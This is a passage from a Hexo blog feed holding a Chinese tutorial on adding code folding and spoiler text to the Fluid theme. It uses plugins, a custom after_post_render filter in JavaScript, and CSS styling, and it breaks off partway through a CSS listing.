src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 我的方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 全成就帮手 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 博客 Fluid 主题实现代码折叠和文字遮盖效果</title>
      <link href="/posts/41513.html"/>
      <url>/posts/41513.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><h2 id="方案"><a class="markdownIt-Anchor" href="#方案"></a> 方案</h2><p>hexo 博客默认是没有代码折叠功能的，如果需要实现代码折叠功能，可以安装 hexo-sliding-spoiler 库、借助 Hexo 过滤器功能或者更换代码高亮渲染引擎。</p><ul><li><a href="https://github.com/fletchto99/hexo-sliding-spoiler">hexo-sliding-spoiler</a></li><li><a href="https://kiyanyang.github.io/posts/c4dd4019/">使用 Hexo 过滤器实现代码折叠 By Kiyan</a></li></ul><h2 id="hexo-sliding-spoiler实现代码折叠"><a class="markdownIt-Anchor" href="#hexo-sliding-spoiler实现代码折叠"></a> hexo-sliding-spoiler 实现代码折叠</h2><blockquote><p>hexo-sliding-spoiler 提供 demo 演示：<a href="https://github.com/fletchto99/hexo-sliding-spoiler/blob/master/img/example.gif">https://github.com/fletchto99/hexo-sliding-spoiler/blob/master/img/example.gif</a></p></blockquote><p>安装命令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-sliding-spoiler --save</span><br><span class="line"><span class="comment"># or using yarn</span></span><br><span class="line">yarn add hexo-sliding-spoiler</span><br></pre></td></tr></tbody></table></figure><p>使用示例</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{% spoiler title %}</span><br><span class="line">content</span><br><span class="line">{% endspoiler %}</span><br></pre></td></tr></tbody></table></figure><p>带空格的需要使用双引号</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{% spoiler "Several spaces in the title" %}</span><br><span class="line">content</span><br><span class="line">{% endspoiler %}</span><br></pre></td></tr></tbody></table></figure><p>如果没起作用，可能是 hexo 没有检测到插件，可以到<code>_config.yml</code> 中加上</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">hexo-sliding-spoiler</span></span><br></pre></td></tr></tbody></table></figure><p>使用示例</p><div class="spoiler collapsed">    <div class="spoiler-title">        title    </div>    <div class="spoiler-content">        <figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"Hello, world!"</span>);</span><br></pre></td></tr></tbody></table></figure>    </div></div><p>直接使用的话，会发现代码块和 spoiler 区域有间距，而且标题也是默认白色，如果想要修改的话，可以找到 <code>node_modules\hexo-sliding-spoiler\assets\spoiler.css</code> 进行修改。我的修改如下：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.spoiler</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#353535</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">3px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span> <span class="selector-class">.spoiler-title</span> {</span><br><span class="line">  </span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#303030</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">15px</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#d6d6d6</span>;</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">13px</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">cursor</span>: pointer;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span> <span class="selector-class">.spoiler-title</span><span class="selector-pseudo">:before</span> {</span><br><span class="line">  <span class="attribute">font-weight</span>: bold;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span><span class="selector-class">.collapsed</span> <span class="selector-class">.spoiler-title</span><span class="selector-pseudo">:before</span> {</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">"Show "</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span><span class="selector-class">.expanded</span> <span class="selector-class">.spoiler-title</span><span class="selector-pseudo">:before</span> {</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">"Hide "</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span> <span class="selector-class">.spoiler-content</span> {</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span><br><span class="line">  -moz-<span class="attribute">transition-duration</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -webkit-<span class="attribute">transition-duration</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -o-<span class="attribute">transition-duration</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">transition-duration</span>: <span class="number">0.3s</span>;</span><br><span class="line">  -moz-<span class="attribute">transition-timing-function</span>: ease-in-out;</span><br><span class="line">  -webkit-<span class="attribute">transition-timing-function</span>: ease-in-out;</span><br><span class="line">  -o-<span class="attribute">transition-timing-function</span>: ease-in-out;</span><br><span class="line">  <span class="attribute">transition-timing-function</span>: ease-in-out;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.spoiler</span> <span class="selector-class">.spoiler-content</span> <span class="selector-tag">figure</span> {</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="selector-class">.spoiler</span><span class="selector-class">.collapsed</span> <span class="selector-class">.spoiler-content</span> {</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span><span class="selector-class">.expanded</span> <span class="selector-class">.spoiler-content</span> {</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">3000px</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: auto;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.spoiler</span> <span class="selector-class">.spoiler-content</span> <span class="selector-tag">p</span><span class="selector-pseudo">:first-child</span> {</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">0</span> <span class="meta">!important</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>但还是不太完美，自由度不是很够，也可能是我不太会修改吧。</p><h2 id="更换代码高亮渲染器实现代码折叠目前使用的方案"><a class="markdownIt-Anchor" href="#更换代码高亮渲染器实现代码折叠目前使用的方案"></a> 更换代码高亮渲染器实现代码折叠（目前使用的方案）</h2><p>将渲染器更换为 <a href="https://github.com/nova1751/hexo-shiki-plugin">Hexo Shiki Plugin</a></p><p>实际上我并不知道该插件可以实现代码折叠，而是在配置该插件时发现的代码折叠功能，该功能在插件内实际是 <code>highlight_height_limit</code> 项，代码超出此项设定的高度则自动折叠。</p><div class="note warning flat"><p>⚠️注意：</p><p>该插件在代码类型的处理上存在 bug，详见：<a href="https://github.com/nova1751/hexo-shiki-plugin/issues/5">issue</a></p><p>解决办法是所有代码类型以后只写小写。</p></div><h2 id="hexo-spoiler实现文字遮盖"><a class="markdownIt-Anchor" href="#hexo-spoiler实现文字遮盖"></a> hexo-spoiler 实现文字遮盖</h2><p><code>hexo-sliding-spoiler</code> 是受 <code>hexo-spoiler</code> 插件的启发而成的。<code>hexo-spoiler</code> 同样可以帮助你做到文字遮挡效果：</p><p>在线演示：<a href="http://htmlpreview.github.io/?https://github.com/unnamed42/hexo-spoiler/blob/master/example/index.html">http://htmlpreview.github.io/?https://github.com/unnamed42/hexo-spoiler/blob/master/example/index.html</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202411022016966.gif" alt="recording"></p><p>安装命令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-spoiler --save</span><br></pre></td></tr></tbody></table></figure><p>和上面的插件一样，如果没有起作用可能是配置文件得配置一下</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">plugins:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="string">hexo-spoiler</span></span><br></pre></td></tr></tbody></table></figure><p>语法</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{% spoiler option:value text... %}</span><br></pre></td></tr></tbody></table></figure><p>option:value 中的 value 为可配置选项：</p><table><thead><tr><th>Optionname 选项名</th><th> Type 类型</th><th> value 值</th><th> Effect 效果</th></tr></thead><tbody><tr><td>style</td><td> string</td><td>blur or box</td><td> 文本将被模糊处理或是被方框覆盖</td></tr><tr><td> color</td><td>string</td><td>All valid css color<br><strong>NO</strong> spaces allowed for inline option!</td><td> 仅在 style:box 时起作用；更改框的颜色。默认颜色为<code>黑色</code>。（不允许内联选项中存在空格）</td></tr><tr><td>p</td><td><code>boolean</code>(in <code>_config.yml</code> or front-matter)<br><code>string</code>(in inline options)</td><td>empty or any string</td><td> 遮盖文字将因 &lt;p&gt; 标签换行而非 &lt; span &gt; 标签。如果你想在剧透文本前后加一个新行，可以添加这个。<br>对于内联选项，分配任何值（除了 <code>“false”</code>），甚至忽略它会打开它；<code>“false”</code> 意味着关闭。默认状态为关闭。</td></tr></tbody></table><p>这表的配置项都在<code>_config.yml</code> 中进行配置，例如：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ... other configs</span></span><br><span class="line"><span class="comment"># be top-level</span></span><br><span class="line"><span class="attr">spoiler:</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">blur</span></span><br><span class="line">  <span class="attr">p:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><p>对于单独的一篇文章，你可以在文章的 front-matter 中设置，例如：</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: blah blah</span><br><span class="line">spoiler:</span><br><span class="line">  style: box</span><br><span class="line">  color: yellow</span><br><span class="line"><span class="section">  p: false</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></tbody></table></figure><p>优先级：inline option 内联选项 &gt; front-matter &gt; _config.yml &gt; default</p><div class="note warning flat"><p>warning</p><p>如果你改变了<code>_config.yml</code>，请运行 <code>hexo clean</code> 清除缓存。</p></div><h2 id="hexo过滤器实现代码折叠若不更换高亮渲染则推荐这个"><a class="markdownIt-Anchor" href="#hexo过滤器实现代码折叠若不更换高亮渲染则推荐这个"></a> Hexo 过滤器实现代码折叠（若不更换高亮渲染则推荐这个）</h2><div class="note info flat"><p><code>Kiyan</code> 佬的文章启发了我，于是我自行钻研了一下才有了这一段。这一段内容实际是我后来才加上的，所以放在了这里，文章顺序有点奇怪见谅。</p><ul><li><a href="https://kiyanyang.github.io/posts/c4dd4019/">使用 Hexo 过滤器实现代码折叠 By Kiyan</a></li></ul></div><h3 id="编写js"><a class="markdownIt-Anchor" href="#编写js"></a> 编写 js</h3><p>由于 fluid 主题已经引入了 Bootstrap，所以我们可以编写一个 js 文件来满足我们的要求。</p><p>在 <code>scripts</code> 目录下创建 <code>codeFloding.js</code>：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取唯一 ID</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getUuid</span>(<span class="params"></span>) {</span><br><span class="line">  <span class="comment">// 生成一个随机的唯一标识符，由当前时间戳和随机数拼接而成</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substring</span>(<span class="number">2</span>, <span class="number">8</span>) + <span class="title class_">Date</span>.<span class="title function_">now</span>().<span class="title function_">toString</span>(<span class="number">36</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册 Hexo 的过滤器，在文章渲染后处理代码块</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(</span><br><span class="line">  <span class="string">"after_post_render"</span>,</span><br><span class="line">  <span class="function">(<span class="params">data</span>) =&gt;</span> {</span><br><span class="line">    <span class="comment">// 获取代码高亮设置</span></span><br><span class="line">    <span class="keyword">const</span> { line_number, lib } = hexo.<span class="property">theme</span>.<span class="property">config</span>.<span class="property">code</span>.<span class="property">highlight</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> reg;</span><br><span class="line">    <span class="comment">// 根据使用的高亮库设置正则表达式</span></span><br><span class="line">    <span class="keyword">if</span> (lib === <span class="string">"highlightjs"</span>) {</span><br><span class="line">      <span class="keyword">if</span> (line_number) {</span><br><span class="line">        reg = <span class="regexp">/(&lt;figure class="highlight.+?&gt;)(.+?hljs (.*?)".+?)(&lt;\/figure&gt;)/gim</span>s; <span class="comment">// 处理包含行号的 figure</span></span><br><span class="line">      } <span class="keyword">else</span> {</span><br><span class="line">        reg = <span class="regexp">/(&lt;div class="code-wrapper.+?&gt;)(.+?hljs (.*?)".+?)(&lt;\/div&gt;)/gim</span>s; <span class="comment">// 处理不包含行号的 div</span></span><br><span class="line">      }</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (lib === <span class="string">"prismjs"</span>) {</span><br><span class="line">      reg = <span class="regexp">/(&lt;div class="code-wrapper.+?&gt;)(.+?data-language="(.*?)".+?)(&lt;\/div&gt;)/gim</span>s; <span class="comment">// 处理 PrismJS 的代码块</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// match begin inner lang end offset string 分别表示的意思是：匹配到的内容的开始、内容、语言、结束、偏移量、原始字符串</span></span><br><span class="line">    data.<span class="property">content</span> = data.<span class="property">content</span>.<span class="title function_">replace</span>(reg, <span class="function">(<span class="params">match, begin, inner, lang, end, offset, string</span>) =&gt;</span> {</span><br><span class="line">      <span class="keyword">const</span> collapseId = <span class="string">`collapse-<span class="subst">${getUuid()}</span>`</span>; <span class="comment">// 生成唯一的折叠 ID</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 创建一个容器，用于包裹按钮和语言提示</span></span><br><span class="line">      <span class="keyword">const</span> collapseContainer = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;div class="collapse-header"&gt;</span></span><br><span class="line"><span class="string">          &lt;button class="collapse-btn collapsed" type="button" data-toggle="collapse" data-target="#<span class="subst">${collapseId}</span>"&gt;</span></span><br><span class="line"><span class="string">            &lt;svg t="1730562455310" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9905"&gt;</span></span><br><span class="line"><span class="string">              &lt;path d="M857.766234 511.488511L345.623017 0 297.174825 49.348412 759.846873 511.488511 297.174825 974.651588 345.623017 1022.977023z" fill="#ffffff" p-id="9906"&gt;</span></span><br><span class="line"><span class="string">              &lt;/path&gt;</span></span><br><span class="line"><span class="string">            &lt;/svg&gt;</span></span><br><span class="line"><span class="string">          &lt;/button&gt;</span></span><br><span class="line"><span class="string">          &lt;span&gt;<span class="subst">${lang}</span>&lt;/span&gt; &lt;!-- 显示代码语言 --&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">      `</span>;</span><br><span class="line">      <span class="comment">// collapse表示默认收起，collapse show表示默认展开</span></span><br><span class="line">      <span class="keyword">const</span> collapseDiv = <span class="string">`&lt;div class="collapse" id="<span class="subst">${collapseId}</span>"&gt;<span class="subst">${inner}</span>&lt;/div&gt;`</span>;</span><br><span class="line">      <span class="keyword">return</span> begin + collapseContainer + collapseDiv + end; <span class="comment">// 返回修改后的内容</span></span><br><span class="line">    });</span><br><span class="line">    <span class="keyword">return</span> data; <span class="comment">// 返回处理后的数据</span></span><br><span class="line">  },</span><br><span class="line">  <span class="number">10000</span> <span class="comment">// 设置优先级，使得在其他渲染后执行</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>这份代码的核心在于 <code>&lt;button class="collapse-btn collapsed"&gt;</code> 中的属性：</p><figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-toggle=<span class="string">"collapse"</span> data-target=<span class="string">"#${collapseId}"</span></span><br></pre></td></tr></tbody></table></figure><p>为什么这么说呢？</p><p>当使用 <code>data-toggle="collapse"</code> 和 <code>data-target</code> 属性时，Bootstrap 的 JavaScript 会自动识别这些属性并处理折叠效果。这意味着我们<strong>不需要手动编写</strong>任何其他 JavaScript 代码来控制折叠内容的显示和隐藏。</p><p>处理过程是：</p><ol><li>当收起或展开按钮被点击时，Bootstrap 先查找与 <code>data-target</code> 属性对应的元素（这里是被加上了 <code>id="${collapseId}"</code> 的 <code>collapseDiv</code>）。</li><li>根据当前状态，Bootstrap 会往查找到的带 <code>data-target</code> 值（这里是 <code>collapseId</code>）的标签中添加或移除 <code>show</code> 类，从而控制折叠内容的显示或隐藏。<br>人话是：Bootstrap 会自动给 <code>const collapseDiv</code> 加上 <code>show</code> 类或移除来控制展开还是收起。<code>collapseDiv</code> 这里是代码块。</li><li>同时给按钮更新 <code>aria-expanded</code> 属性，以反映当前状态（值为 true 即展开反之则收起）。</li><li>同时给按钮增加 <code>collapsed</code> 类来标识收起状态，若无此类则表示展开。</li></ol><p>所以，这里有两个值的设定需要注意：</p><ol><li><code>const collapseDiv</code> 的 <code>class="collapse"</code>：<br>若类名为 <code>class="collapse"</code> 表示默认将代码块收起，<code>collapse show</code> 表示默认展开。</li><li><code>const collapseDiv</code> 的类名若为不带 show 的类名表示默认收起，则 <code>&lt;button class="collapse-btn collapsed"</code> 中的类名 <code>class="collapse-btn"</code> 需要加上 <code>collapsed</code>。<br>即：<code>class="collapse-btn collapsed"</code> 与 <code>collapseDiv</code> 收起或展开的状态保持一致。</li></ol><p>例如，我的代码默认行为是将代码块收起，所以要设置 <code>const collapseDiv</code> 为：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> collapseDiv = <span class="string">`&lt;div class="collapse" id="<span class="subst">${collapseId}</span>"&gt;<span class="subst">${inner}</span>&lt;/div&gt;`</span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>且</strong>按钮 button 应设置为：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button <span class="keyword">class</span>=<span class="string">"collapse-btn collapsed"</span> ...略...</span><br></pre></td></tr></tbody></table></figure><p>另外，你也可以找一个你喜欢的 svg 图用于设置按钮的图标。</p><blockquote><p>相关推荐：<a href="https://www.iconfont.cn/">阿里巴巴矢量图库</a></p></blockquote><h3 id="编写css"><a class="markdownIt-Anchor" href="#编写css"></a> 编写 css</h3><p>在 <code>source\css\</code> 目录下创建 <code>codeFloding.css</code>：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.collapse-header</span> {</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">0</span> <span class="number">0</span>; <span class="comment">/* 设置圆角，使背景更柔和 */</span></span><br><span class="line">  <span class="attribute">position</span>: relative; <span class="comment">/* 使按钮可以定位 */</span></span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#303030</span>; <span class="comment">/* 设置背景颜色为深灰色 */</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">5px</span>; <span class="comment">/* 添加上下左右各5px的内边距 */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-tag">span</span> {</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-tag">button</span> {</span><br><span class="line">  <span class="attribute">border</span>: none; <span class="comment">/* 去掉按钮的边框 */</span></span><br><span class="line">  <span class="attribute">margin-right</span>: <span class="number">5px</span>; <span class="comment">/* 按钮与语言文本之间的间隔 */</span></span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#303030</span>; <span class="comment">/* 按钮背景与容器背景相同 */</span></span><br><span class="line">  <span class="attribute">cursor</span>: pointer; <span class="comment">/* 鼠标悬停时显示为手指光标，表示可点击 */</span></span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease; <span class="comment">/* 添加平滑的旋转过渡效果 */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-tag">button</span><span class="selector-pseudo">:focus</span> {</span><br><span class="line">  <span class="attribute">outline</span>: none; <span class="comment">/* 去掉按钮的聚焦样式，保持界面简洁 */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-tag">button</span> <span class="selector-tag">svg</span> {</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">fill</span>: white;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease; <span class="comment">/* 添加过渡效果 */</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 初始状态：箭头向右，为收起状态 */</span></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-class">.collapse-btn</span><span class="selector-class">.collapsed</span> {</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">0deg</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 点击按钮后，箭头向下，为展开状态 */</span></span><br><span class="line"><span class="selector-class">.collapse-header</span> <span class="selector-class">.collapse-btn</span> {</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">rotate</span>(<span class="number">90deg</span>);</span><br><span 